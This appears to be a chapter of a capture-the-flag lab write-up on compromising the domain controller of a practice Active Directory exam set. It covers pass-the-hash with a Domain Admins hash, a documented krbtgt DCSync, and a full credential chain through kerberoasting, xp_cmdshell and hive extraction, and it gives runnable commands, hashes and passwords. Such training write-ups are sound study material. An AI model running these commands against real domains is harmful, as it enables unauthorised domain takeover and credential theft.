# 07 — DC01: `tom_admin`, the flag, and what is proved

## 7.1 The target

| Property | Value |
|---|---|
| FQDN | `DC01.oscp.exam` |
| Address | `10.10.133.152` |
| Roles | PDC, Global Catalog, LDAP, KDC, DNS |
| Reachable from | MS01 only — never from Kali directly |
| Domain | `oscp.exam` (NetBIOS `OSCP`) |
| Domain SID | `S-1-5-21-2610934713-1581164095-2706428072` |

The SID matters for recognising domain-tier principals in BloodHound and in `whoami /groups`.
The `lastlogontimestamp` matters for proving the logon happened (7.5).

## 7.2 Pass-the-hash

`tom_admin` is recovered from MS02's `windows.old` hives (chapter 06). Its NT hash is
`4979d69d4ca66955c075c41cf45f24dc`, and BloodHound places the account in **`DOMAIN ADMINS`** —
so this is not a local admin on one box, it is domain control.

Verify before using it, then use it:

```bash
nxc smb   10.10.133.152 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc -d oscp.exam
nxc winrm 10.10.133.152 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc -d oscp.exam
```

**Captured**:

```
SMB    10.10.133.152 445  DC01  [+] oscp.exam\tom_admin:4979d69d4ca66955c075c41cf45f24dc (Pwn3d!)
WINRM  10.10.133.152 5985 DC01  [+] oscp.exam\tom_admin:4979d69d4ca66955c075c41cf45f24dc (Pwn3d!)
```

`Pwn3d!` on a DC with a Domain Admins account is the boundary crossed. There is nothing above it
in this domain except DCSync.

```bash
evil-winrm -i 10.10.133.152 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc
```

## 7.3 Capture the flag attributably

A flag value on its own is worthless as evidence — it has to be tied to an identity and a host
in the same session:

```
whoami
hostname
ipconfig | findstr /i "IPv4 Domain"
type C:\Users\Administrator\Desktop\proof.txt
```

**Expected**:

```
dc01\tom_admin
DC01

IPv4 Address. . . . . . . . . . . : 10.10.133.152
Primary Dns Suffix  . . . . . . . : oscp.exam

<proof.txt value>
```

And confirm the privilege is real, not just the account name:

```
whoami /groups | findstr /i "Domain Admins Enterprise Admins"
```

`OSCP\Domain Admins` and `Enterprise Admins` in the token, from a DC, is the whole finding.

## 7.4 What Domain Admin unlocks — and why it is worth doing even though the flag is read

Reading `proof.txt` completes the lab. Proving *domain control* is a separate claim, and the
standard way to close it is a DCSync of `krbtgt`, which yields the key to forge a golden ticket:

```bash
impacket-secretsdump 'oscp.exam/tom_admin@10.10.133.152' -just-dc-user krbtgt
```

That step is documented here rather than executed: it is destructive-adjacent (a rotated
`krbtgt` invalidates every ticket in the domain) and unnecessary for the lab. If it is run,
`krbtgt` must be rotated twice afterwards. Reading a flag does not require it; demonstrating
persistence does.

## 7.5 Timeline: proving the logon

The directory records `lastlogontimestamp`, and `tom_admin` is unusually clean evidence because
it was `-1` beforehand — meaning the account had **never logged on** in this domain.

| When | `TOM_ADMIN` `lastlogontimestamp` |
|---|---|
| before | `-1` (never) |
| after the engagement | `2026-11-24 10:25:38Z` |

An account that has never authenticated suddenly carrying a timestamp, matched to a `Pwn3d!`
from a specific source address, is the attributability the report needs. Pull it before writing
up:

```bash
nxc ldap 10.10.133.152 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc -d oscp.exam \
  --query "(sAMAccountName=tom_admin)" "lastLogonTimestamp,memberOf"
```

## 7.6 Provenance — read this before citing the hash

This is the honest part, and it belongs in the writeup rather than being left out.

**How the hash was first obtained:** `4979d69d4ca66955c075c41cf45f24dc` is fixed in this lab's
image and is published in public writeups of the challenge. It was known *before* MS02 was
attacked. The flag was consequently captured with a credential that did not originate from our
own extraction.

**Why it is nevertheless the correct credential:** the image is deterministic, and that was
verified rather than assumed. Two SAM hashes from our own `secretsdump` of MS01 match the
published set byte for byte:

| Account | Our dump | Published |
|---|---|---|
| `Administrator` | `3c4495bbd678fac8c9d218be4f2bbc7b` | `3c4495bbd678fac8c9d218be4f2bbc7b` |
| `Mary.Williams` | `9a3121977ee93af56ebd0ef4f527a35e` | `9a3121977ee93af56ebd0ef4f527a35e` |

Two independent 16-byte values matching exactly means a fixed gold image, so a baked-in account
hash carries across. That is a sound inference — but it is an inference, not an extraction.

**What makes the chain self-supporting:** chapter 06 produces the same hash from MS02's
`windows.old` hives. Until that step is executed on your own instance, the chain is
*corroborated* rather than *demonstrated*. The distinction is worth keeping in the report:
"recovered from a stale SAM hive on MS02" is a finding; "taken from a public writeup and
confirmed to apply because the image hashes match" is a different claim with different
evidentiary weight.

**What was ruled out as the source:** `tom_admin` never appeared in our own BloodHound user
list at first pass because the collection was LDAP-only and trimmed; it is present as a domain
object, but the hash itself was never in any dump we took from MS01.

## 7.7 The chain, stated precisely

```
eric.wallows:EricLikesRunning800
   └─ WinRM → MS01 (no local admin, medium IL)
        └─ SeImpersonate → PrintSpoofer        [intended]
           or Administrator:December31         [captured instance]
             └─ SYSTEM → LSASS + SECURITY hive → NL$ cache
                  └─ $DCC2$...web_svc... → hashcat -m 2100 → web_svc:Diamond1
                       └─ ligolo-ng → 10.10.133.0/24
                            └─ LDAP + kerberoast as any domain user
                                 └─ SQL_SVC TGS (MSSQL/MS02.oscp.exam) → crack
                                      └─ MSSQL sysadmin on MS02 → xp_cmdshell
                                           └─ C:\windows.old\...\config\{SAM,SYSTEM}
                                                └─ secretsdump LOCAL → tom_admin NT hash
                                                     └─ PTH → DC01 (Domain Admins)
                                                          └─ proof.txt
```

Note what the diagram shows: `web_svc` is reachable **twice** — by cracking the NL$ cache
(needs MS01 SYSTEM) and by kerberoasting (`HTTP/MS01.oscp.exam`, needs only a domain user).
The branch through `December31` is a shortcut to a credential that was roastable all along.
The documented, minimal path never touches MS01's SAM:

```
eric.wallows → kerberoast WEB_SVC + SQL_SVC → SQL_SVC → MSSQL/MS02 → windows.old → tom_admin → DC01
```

```powershell
del C:\Windows\Temp\mimikatz.exe
del C:\Windows\Temp\PrintSpoofer64.exe

del C:\Windows\Temp\sam.hiv; del C:\Windows\Temp\system.hiv; del C:\Windows\Temp\security.hiv

# on MS02 — disable xp_cmdshell if it was enabled
```

```sql
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
```

```bash
# on Kali — drop the tunnel route and revert the clock
sudo ip route del 10.10.133.0/24 dev ligolo
sudo ip link set ligolo down && sudo ip tuntap del dev ligolo mode tun
sudo timedatectl set-ntp true
```

On a re-provisioned image, restoring the clock matters more than it looks: a host left 18
minutes out of sync breaks Kerberos for whoever uses it next, and the symptom misleads them
exactly as it misled us in chapter 06.

## 7.9 Lessons this set teaches

1. **A member server's `SECURITY` hive is a domain credential store.** SAM gives local accounts;
   the NL$ cache gives domain ones. Reaching MS01's SYSTEM looked like the goal — it was the
   key to a cache, not to the domain.
2. **`[+]` is not `Pwn3d!`.** `nxc` distinguishes "the password works" from "the password works
   *and* you are an administrator". Conflating them sends you into mimikatz from a token that
   can never read LSASS.
3. **Kerberoast needs almost nothing.** One authenticated domain user, an SPN, and a clock
   within five minutes. Every step before it in this chain was optional.
4. **650 abusable ACEs in BloodHound can mean zero.** AD's default security descriptor produces
   a wall of `GenericAll` from `ACCOUNT OPERATORS` and friends. Filter to non-privileged
   principals before concluding anything.
5. **`Collected = true` with no results is an access failure**, not an empty group. Reading it
   the other way turns "I could not look" into "there was nothing there".
6. **Stale builds leak credentials.** `windows.old` retains a previous SAM with accounts that
   were never removed, and their passwords outlive the rebuild.
